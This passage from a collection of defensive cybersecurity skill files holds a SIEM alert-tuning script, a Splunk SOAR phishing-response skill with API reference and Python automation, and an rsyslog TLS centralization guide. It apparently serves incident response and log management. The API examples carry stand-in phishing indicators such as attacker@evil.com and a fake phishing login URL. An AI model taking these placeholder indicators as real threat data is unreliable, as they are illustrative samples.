            hourly_counts[dt.strftime("%Y-%m-%d %H")] += 1
        except (ValueError, AttributeError):
            continue
    if not hourly_counts:
        return None
    values = list(hourly_counts.values())
    mean = sum(values) / len(values)
    variance = sum((x - mean) ** 2 for x in values) / len(values)
    stdev = math.sqrt(variance)
    return {
        "rule_name": rule_name,
        "hourly_mean": round(mean, 2),
        "hourly_stdev": round(stdev, 2),
        "suggested_threshold_2sd": round(mean + 2 * stdev, 0),
        "suggested_threshold_3sd": round(mean + 3 * stdev, 0),
        "sample_hours": len(hourly_counts),
    }


def generate_tuning_report(metrics, whitelist, thresholds):
    """Generate comprehensive tuning report with recommendations."""
    high_fp_rules = [m for m in metrics if m["fp_rate"] > 0.7]
    medium_fp_rules = [m for m in metrics if 0.3 < m["fp_rate"] <= 0.7]
    total_alerts = sum(m["total_alerts"] for m in metrics)
    total_fp = sum(m["false_positives"] for m in metrics)
    projected_reduction = sum(w["fp_count"] for w in whitelist)

    return {
        "analysis_time": datetime.utcnow().isoformat() + "Z",
        "summary": {
            "total_rules_analyzed": len(metrics),
            "total_alerts": total_alerts,
            "total_false_positives": total_fp,
            "overall_fp_rate": round(total_fp / total_alerts, 4) if total_alerts else 0,
            "high_fp_rules": len(high_fp_rules),
            "whitelist_candidates": len(whitelist),
            "projected_alert_reduction": projected_reduction,
        },
        "high_fp_rules": high_fp_rules,
        "medium_fp_rules": medium_fp_rules,
        "whitelist_recommendations": whitelist[:20],
        "threshold_recommendations": thresholds,
        "actions": [
            {"priority": "high", "action": f"Disable or rewrite {len(high_fp_rules)} rules with FP rate > 70%"},
            {"priority": "medium", "action": f"Add {len(whitelist)} whitelist entries to reduce {projected_reduction} FP alerts"},
            {"priority": "low", "action": f"Review {len(medium_fp_rules)} rules with FP rate 30-70%"},
        ],
    }


def main():
    parser = argparse.ArgumentParser(description="SIEM Use Case Tuning Agent")
    parser.add_argument("--alert-csv", required=True, help="CSV export of SIEM alerts with disposition data")
    parser.add_argument("--fp-threshold", type=float, default=0.8, help="FP ratio threshold for whitelist candidates")
    parser.add_argument("--top-rules", type=int, default=5, help="Number of top rules to compute thresholds for")
    parser.add_argument("--output", default="tuning_report.json", help="Output report path")
    args = parser.parse_args()

    alerts = load_alert_data(args.alert_csv)
    print(f"[+] Loaded {len(alerts)} alerts from {args.alert_csv}")

    metrics = calculate_rule_metrics(alerts)
    print(f"[+] Analyzed {len(metrics)} unique detection rules")

    whitelist = identify_whitelist_candidates(alerts, args.fp_threshold)
    print(f"[+] Found {len(whitelist)} whitelist candidates (FP ratio >= {args.fp_threshold})")

    thresholds = []
    for m in metrics[:args.top_rules]:
        t = compute_threshold_recommendation(alerts, m["rule_name"])
        if t:
            thresholds.append(t)

    report = generate_tuning_report(metrics, whitelist, thresholds)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    print(f"[+] Tuning report saved to {args.output}")
    print(f"[+] Overall FP rate: {report['summary']['overall_fp_rate']:.1%}")
    print(f"[+] Projected alert reduction from whitelisting: {report['summary']['projected_alert_reduction']}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/implementing-soar-playbook-for-phishing/SKILL.md =====
---
name: implementing-soar-playbook-for-phishing
description: Automates phishing incident response by calling the Splunk SOAR (Phantom)
  REST API to create containers, attach artifacts (emails, URLs, attachments), and
  trigger response playbooks. Use when building or wiring up a Splunk SOAR phishing
  playbook, ingesting a suspected phishing report into SOAR, or automating containment
  and triage for phishing incidents.
domain: cybersecurity
subdomain: security-operations
tags:
- soar
- splunk-phantom
- phishing
- incident-response
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1566
- T1598
mitre_f3:
  version: '1.1'
  tactics:
  - reconnaissance
  - resource-development
  - initial-access
  - stealth
  techniques:
  - id: T1598
    name: Phishing for Information
    tactic: reconnaissance
    source: attack
  - id: T1660
    name: Phishing
    tactic: initial-access
    source: attack
  - id: T1672
    name: Email Spoofing
    tactic: stealth
    source: attack
  - id: F1020.002
    name: 'Create Fake Materials: Fake Website'
    tactic: resource-development
    source: f3
  - id: F1032
    name: Impersonate Official
    tactic: initial-access
    source: f3
---


# Implementing SOAR Playbook for Phishing

## Overview

This skill implements a phishing incident response workflow using the Splunk SOAR (formerly Phantom) REST API. When a suspected phishing email is reported, the agent parses email headers and body, creates a SOAR container representing the incident, attaches artifacts containing indicators of compromise (sender address, URLs, IP addresses, file hashes), triggers an automated investigation playbook, and polls for action results.

Splunk SOAR orchestrates and automates security operations through playbooks that chain together investigative and response actions. The REST API at `/rest/container`, `/rest/artifact`, and `/rest/playbook_run` enables programmatic incident creation and automation triggering from external tools, email gateways, and SIEM alerts.


## When to Use

- When deploying or configuring implementing soar playbook for phishing capabilities in your environment
- When establishing security controls aligned to compliance requirements
- When building or improving security architecture for this domain
- When conducting security assessments that require this implementation

## Prerequisites

- Python 3.9 or later with `requests` and `email` modules
- Splunk SOAR instance (Cloud or On-Premises) with REST API access
- SOAR API token with permissions to create containers and trigger playbooks
- Network connectivity to SOAR instance on port 443
- A configured phishing investigation playbook in SOAR

## Steps

1. **Parse the phishing email**: Read the email file (.eml format) and extract headers including From, To, Subject, Reply-To, Return-Path, Received, Message-ID, X-Mailer, and authentication results (SPF, DKIM, DMARC). Extract URLs and IP addresses from the email body.

2. **Authenticate to SOAR REST API**: Use the API token in the `ph-auth-token` header to authenticate all REST API requests to the SOAR instance.

3. **Create a container**: POST to `/rest/container` with the incident label, name, description, severity, and status. The container represents the phishing incident and receives a container ID in the response.

4. **Add email header artifacts**: POST to `/rest/artifact` with `container_id` and CEF (Common Event Format) fields containing sender address (`fromAddress`), recipient (`toAddress`), subject, originating IP (`sourceAddress`), and Message-ID. Set `run_automation` to False for all but the last artifact.

5. **Add URL artifacts**: For each URL extracted from the email body, create an artifact with CEF field `requestURL` and type `url`. These artifacts feed into URL reputation checks in the playbook.

6. **Trigger the playbook**: POST to `/rest/playbook_run` with the playbook ID or name and the container ID. This initiates the automated investigation workflow.

7. **Poll action results**: GET `/rest/action_run` filtered by container ID to monitor playbook progress. Poll until all actions reach a terminal state (success, failed, or cancelled).

8. **Compile response report**: Aggregate playbook action results into a summary report with verdicts from URL reputation, domain reputation, IP geolocation, and email header analysis.

## Expected Output

```json
{
  "incident": {
    "container_id": 1542,
    "status": "new",
    "severity": "high",
    "artifacts_created": 5
  },
  "playbook": {
    "name": "phishing_investigate",
    "run_id": 892,
    "status": "success",
    "actions_completed": 8
  },
  "verdict": "malicious",
  "indicators": {
    "sender_domain_reputation": "malicious",
    "urls_flagged": 2,
    "spf_result": "fail",
    "dkim_result": "fail"
  }
}
```

===== END FILE =====


===== FILE: skills/implementing-soar-playbook-for-phishing/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/implementing-soar-playbook-for-phishing/references/api-reference.md =====
# SOAR Phishing Playbook API Reference

## Splunk SOAR REST API

### Authentication
All requests require the `ph-auth-token` header:
```
ph-auth-token: <your-api-token>
```

### Create Container (Incident)
```
POST /rest/container
```
```json
{
  "name": "Phishing: Suspicious invoice email",
  "description": "User reported phishing email",
  "label": "phishing",
  "severity": "high",
  "status": "new",
  "sensitivity": "amber",
  "owner_id": 1,
  "tags": ["phishing", "email"]
}
```
Response: `{"success": true, "id": 1542}`

### Create Artifact
```
POST /rest/artifact
```
```json
{
  "container_id": 1542,
  "name": "Sender Email",
  "label": "email",
  "type": "email",
  "severity": "high",
  "cef": {
    "fromAddress": "attacker@evil.com",
    "toAddress": "victim@company.com",
    "emailSubject": "Urgent Invoice #9921",
    "sourceAddress": "198.51.100.23",
    "requestURL": "https://evil-phish.com/login"
  },
  "run_automation": true
}
```
Response: `{"success": true, "id": 8834}`

### Trigger Playbook
```
POST /rest/playbook_run
```
```json
{
  "container_id": 1542,
  "playbook_id": "local/phishing_investigate",
  "scope": "new",
  "run": true
}
```

### List Action Runs
```
GET /rest/action_run?_filter_container=1542&page_size=100
```

### Get Container Details
```
GET /rest/container/{container_id}
GET /rest/container/{container_id}/artifacts
GET /rest/container/{container_id}/actions
```

### Update Container Status
```
POST /rest/container/{container_id}
```
```json
{"status": "closed", "close_reason": "resolved"}
```

## XSOAR (Cortex XSOAR) API Comparison

### Create Incident
```
POST /incident
```
```json
{
  "name": "Phishing Report",
  "type": "Phishing",
  "severity": 3,
  "labels": [
    {"type": "Email/from", "value": "attacker@evil.com"},
    {"type": "Email/subject", "value": "Urgent Invoice"}
  ]
}
```

### Run Playbook on Incident
```
POST /incident/investigate
```
```json
{"id": "1542", "playbookId": "phishing_investigation"}
```

## Common Phishing Playbook Actions

| Action | App | Description |
|--------|-----|-------------|
| `url reputation` | VirusTotal | Check URL against VT database |
| `domain reputation` | VirusTotal | Check sender domain reputation |
| `ip reputation` | AbuseIPDB | Check originating IP reputation |
| `whois domain` | WHOIS | Domain registration lookup |
| `detonate url` | URLScan.io | Sandbox URL detonation |
| `get email headers` | IMAP | Retrieve full email headers |
| `block sender` | Exchange | Block sender at email gateway |
| `quarantine email` | O365 | Remove email from all mailboxes |

===== END FILE =====


===== FILE: skills/implementing-soar-playbook-for-phishing/scripts/agent.py =====
#!/usr/bin/env python3
"""Splunk SOAR phishing playbook automation via REST API."""

import argparse
import email
import json
import re
import time

import requests
from email import policy
from email.parser import BytesParser


URL_PATTERN = re.compile(r'https?://[^\s<>"\']+', re.IGNORECASE)
IP_PATTERN = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')


class SOARClient:
    def __init__(self, base_url: str, token: str, verify_ssl: bool = True):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update({
            "ph-auth-token": token,
            "Content-Type": "application/json",
        })
        self.session.verify = verify_ssl

    def create_container(self, name: str, description: str, severity: str,
                         label: str = "events") -> dict:
        payload = {
            "name": name,
            "description": description,
            "severity": severity,
            "label": label,
            "status": "new",
            "sensitivity": "amber",
        }
        resp = self.session.post(f"{self.base_url}/rest/container", json=payload, timeout=30)
        resp.raise_for_status()
        data = resp.json()
        return {"container_id": data.get("id"), "success": data.get("success", False)}

    def add_artifact(self, container_id: int, name: str, cef: dict,
                     label: str = "event", severity: str = "medium",
                     artifact_type: str = "network", run_automation: bool = False) -> dict:
        payload = {
            "container_id": container_id,
            "name": name,
            "label": label,
            "severity": severity,
            "type": artifact_type,
            "cef": cef,
            "run_automation": run_automation,
        }
        resp = self.session.post(f"{self.base_url}/rest/artifact", json=payload, timeout=30)
        resp.raise_for_status()
        data = resp.json()
        return {"artifact_id": data.get("id"), "success": data.get("success", False)}

    def trigger_playbook(self, playbook_name: str, container_id: int,
                         scope: str = "new") -> dict:
        payload = {
            "container_id": container_id,
            "playbook_id": playbook_name,
            "scope": scope,
            "run": True,
        }
        resp = self.session.post(f"{self.base_url}/rest/playbook_run", json=payload, timeout=30)
        resp.raise_for_status()
        return resp.json()

    def get_action_runs(self, container_id: int) -> list:
        resp = self.session.get(
            f"{self.base_url}/rest/action_run",
            params={"_filter_container": container_id, "page_size": 100},
            timeout=30,
        )
        resp.raise_for_status()
        return resp.json().get("data", [])

    def poll_playbook(self, container_id: int, timeout: int = 300,
                      interval: int = 10) -> list:
        terminal_states = {"success", "failed", "cancelled"}
        elapsed = 0
        while elapsed < timeout:
            runs = self.get_action_runs(container_id)
            if runs and all(r.get("status") in terminal_states for r in runs):
                return runs
            time.sleep(interval)
            elapsed += interval
        return self.get_action_runs(container_id)


def parse_email_file(email_path: str) -> dict:
    with open(email_path, "rb") as f:
        msg = BytesParser(policy=policy.default).parse(f)

    headers = {
        "from": msg.get("From", ""),
        "to": msg.get("To", ""),
        "subject": msg.get("Subject", ""),
        "reply_to": msg.get("Reply-To", ""),
        "return_path": msg.get("Return-Path", ""),
        "message_id": msg.get("Message-ID", ""),
        "date": msg.get("Date", ""),
        "x_mailer": msg.get("X-Mailer", ""),
    }

    received_headers = msg.get_all("Received", [])
    auth_results = msg.get("Authentication-Results", "")
    spf_result = "none"
    dkim_result = "none"
    dmarc_result = "none"
    if "spf=pass" in auth_results.lower():
        spf_result = "pass"
    elif "spf=fail" in auth_results.lower():
        spf_result = "fail"
    if "dkim=pass" in auth_results.lower():
        dkim_result = "pass"
    elif "dkim=fail" in auth_results.lower():
        dkim_result = "fail"
    if "dmarc=pass" in auth_results.lower():
        dmarc_result = "pass"
    elif "dmarc=fail" in auth_results.lower():
        dmarc_result = "fail"

    body_text = ""
    if msg.is_multipart():
        for part in msg.walk():
            if part.get_content_type() == "text/plain":
                body_text += part.get_content()
            elif part.get_content_type() == "text/html":
                body_text += part.get_content()
    else:
        body_text = msg.get_content()

    urls = list(set(URL_PATTERN.findall(body_text)))
    originating_ips = []
    for recv in received_headers:
        originating_ips.extend(IP_PATTERN.findall(recv))
    originating_ips = list(set(originating_ips))

    return {
        "headers": headers,
        "received_count": len(received_headers),
        "auth": {"spf": spf_result, "dkim": dkim_result, "dmarc": dmarc_result},
        "urls": urls,
        "originating_ips": originating_ips,
    }


def run_phishing_workflow(args) -> dict:
    email_data = parse_email_file(args.email_file)
    client = SOARClient(args.soar_url, args.token, verify_ssl=not args.no_verify)

    sender = email_data["headers"]["from"]
    subject = email_data["headers"]["subject"]
    severity = "high" if email_data["auth"]["spf"] == "fail" else "medium"

    container = client.create_container(
        name=f"Phishing Report: {subject[:80]}",
        description=f"Reported phishing email from {sender}",
        severity=severity,
        label="phishing",
    )
    cid = container["container_id"]

    artifacts_created = 0
    client.add_artifact(cid, "Email Headers", {
        "fromAddress": sender,
        "toAddress": email_data["headers"]["to"],
        "emailSubject": subject,
        "emailMessageId": email_data["headers"]["message_id"],
        "emailReplyTo": email_data["headers"]["reply_to"],
        "emailReturnPath": email_data["headers"]["return_path"],
    }, label="email", artifact_type="email", severity=severity)
    artifacts_created += 1

    for ip in email_data["originating_ips"]:
        client.add_artifact(cid, f"Originating IP: {ip}", {
            "sourceAddress": ip,
        }, label="email", artifact_type="ip", severity="medium")
        artifacts_created += 1

    url_list = email_data["urls"]
    for i, url in enumerate(url_list):
        is_last = (i == len(url_list) - 1) and not args.playbook
        client.add_artifact(cid, f"Embedded URL: {url[:60]}", {
            "requestURL": url,
        }, label="email", artifact_type="url", severity="high",
            run_automation=is_last)
        artifacts_created += 1

    playbook_result = None
    if args.playbook:
        playbook_result = client.trigger_playbook(args.playbook, cid)
        action_runs = client.poll_playbook(cid, timeout=args.poll_timeout)
        playbook_result["action_runs"] = len(action_runs)
        playbook_result["actions_completed"] = sum(
            1 for r in action_runs if r.get("status") == "success"
        )

    return {
        "incident": {
            "container_id": cid,
            "status": "new",
            "severity": severity,
            "artifacts_created": artifacts_created,
        },
        "email_analysis": {
            "sender": sender,
            "subject": subject,
            "urls_found": len(url_list),
            "originating_ips": email_data["originating_ips"],
            "auth": email_data["auth"],
        },
        "playbook": playbook_result,
    }


def main():
    parser = argparse.ArgumentParser(description="SOAR Phishing Playbook Automation")
    parser.add_argument("--soar-url", required=True, help="Splunk SOAR base URL")
    parser.add_argument("--token", required=True, help="SOAR API auth token")
    parser.add_argument("--email-file", required=True, help="Path to .eml phishing email file")
    parser.add_argument("--playbook", default=None,
                        help="Playbook name or ID to trigger")
    parser.add_argument("--poll-timeout", type=int, default=300,
                        help="Max seconds to poll for playbook completion")
    parser.add_argument("--no-verify", action="store_true",
                        help="Disable SSL certificate verification")
    parser.add_argument("--output", default=None, help="Output JSON file path")
    args = parser.parse_args()

    result = run_phishing_workflow(args)
    report = json.dumps(result, indent=2)
    if args.output:
        with open(args.output, "w") as f:
            f.write(report)
    print(report)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/implementing-syslog-centralization-with-rsyslog/SKILL.md =====
---
name: implementing-syslog-centralization-with-rsyslog
description: Configure rsyslog for centralized log collection with TLS encryption,
  custom templates, and log rotation, generating server and client configuration
  files with GnuTLS stream drivers, x509 certificate authentication, per-host log
  segregation, and reliable queue settings. Use when building a centralized, encrypted
  syslog pipeline, hardening rsyslog client/server configs for high-availability log
  infrastructure, or troubleshooting TLS-based syslog forwarding.
domain: cybersecurity
subdomain: security-operations
tags:
- syslog
- rsyslog
- log-centralization
- tls-encryption
- log-management
- security-operations
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1573
- T1486
---


# Implementing Syslog Centralization with Rsyslog


## When to Use

- When deploying or configuring implementing syslog centralization with rsyslog capabilities in your environment
- When establishing security controls aligned to compliance requirements
- When building or improving security architecture for this domain
- When conducting security assessments that require this implementation

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

1. Install dependencies: `pip install jinja2 paramiko`
2. Generate TLS certificates for rsyslog server and clients using OpenSSL.
3. Run the agent to generate rsyslog server and client configurations:
   - Server: TLS listener on port 6514, per-host directory output, JSON-format templates
   - Client: TLS forwarding with disk-assisted queues for reliability
4. Deploy configurations to servers via SSH (paramiko).
5. Validate TLS connectivity and log delivery.

```bash
python scripts/agent.py --server-ip 10.0.0.1 --clients 10.0.0.10,10.0.0.11 --ca-cert ca.pem --output syslog_report.json
```

## Examples

### Server Configuration (TLS)
```
module(load="imtcp" StreamDriver.Name="gtls" StreamDriver.Mode="1"
       StreamDriver.Authmode="x509/name")
input(type="imtcp" port="6514")
template(name="PerHostLog" type="string" string="/var/log/remote/%HOSTNAME%/%PROGRAMNAME%.log")
*.* ?PerHostLog
```

### Client Configuration (Reliable Forwarding)
```
action(type="omfwd" target="10.0.0.1" port="6514" protocol="tcp"
       StreamDriver="gtls" StreamDriverMode="1"
       StreamDriverAuthMode="x509/name"
       queue.type="LinkedList" queue.filename="fwdRule1"
       queue.maxdiskspace="1g" queue.saveonshutdown="on"
       action.resumeRetryCount="-1")
```

===== END FILE =====


===== FILE: skills/implementing-syslog-centralization-with-rsyslog/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
